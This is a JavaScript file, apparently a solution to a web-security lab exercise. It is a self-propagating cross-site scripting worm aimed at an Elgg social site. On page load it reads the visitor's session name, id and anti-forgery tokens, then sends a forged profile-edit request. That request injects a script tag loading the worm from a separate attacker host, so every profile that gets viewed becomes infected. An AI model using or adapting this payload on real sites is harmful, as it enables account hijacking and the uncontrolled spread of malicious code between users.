window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp elgg_ts
//and Security Token elgg_token 
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var sendurl="http://www.xsslabelgg.com/action/profile/edit"//POST target url
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var worm="&description=<script type=\"text/javascript\" src=\"http://www.csrflabattacker.com/5.5_Task4_worm.js\"></script>";
alert(userName+guid);
var content=token+ts+"&name="+userName+worm+guid;
if(userName=='Alice'){//Attacker
var samyGuid=elgg.session.user.guid
}else//victim
{
	var samyGuid="wusuowei"
}
if(elgg.session.user.guid!=samyGuid)								
{
	//Create and send Ajax request to modify profile 
	var Ajax=null;
	Ajax=new XMLHttpRequest(); 
	Ajax.open("POST",sendurl,true); 
	Ajax.setRequestHeader("Host","www.xsslabelgg.com"); 
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(content);
}
}

